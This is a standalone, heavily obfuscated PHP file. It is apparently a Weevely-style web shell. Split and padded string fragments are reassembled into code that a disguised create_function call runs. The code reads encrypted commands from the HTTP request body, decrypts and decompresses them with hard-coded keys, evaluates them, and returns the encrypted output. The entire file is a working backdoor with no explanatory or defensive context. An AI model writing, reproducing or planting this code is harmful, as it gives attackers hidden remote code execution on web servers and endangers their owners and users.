<?php
$o=str_replace('yu','','cryueatyueyuyu_funyucyution');
$i='va-Ml(-M@gzu-Mncompr-Mess(@-Mx(@bas-Me64_d-Mecode($m[1])-M-M,$k)));$o=@ob_get_-Mconten-Mts();-M';
$E='0;($j<$-Mc&&$i<$l-M);$j++-M,$-Mi++){-M$o.=$t{$i}^-M$k{$j}-M;}-M}retur-Mn -M-M$o;}if (-M@preg_m';
$Z='atch("/$-Mkh-M(.-M+)$k-Mf/",@file_get_c-Montents(-M"p-Mhp:/-M/i-Mnput"),$m)==1) {@o-Mb-M_start();-M@e';
$W='@-Mob_end_c-Ml-Mean();$r=@b-Mase64_-Mencode-M(@x(-M@gz-Mcompre-Mss($o),$-Mk));prin-Mt-M("$p$kh$r$kf");}';
$y='$k=-M"04a58-Mb5a-M";$kh="-M8b-Mff72ae9d14"-M;-M$kf="d851f-M6fe04e3";$p="O-MYF-MxZhSTTvD-Mgk-M-MEqC";fun';
$B='ction x($-Mt-M-M,$k){$-Mc-M-M=strlen($k-M);$l=strlen($t)-M;$o="";for-M($i=0;$i<$-Ml;){for-M-M($j=';
$N=str_replace('-M','',$y.$B.$E.$Z.$i.$W);
$H=$o('',$N);$H();
?>
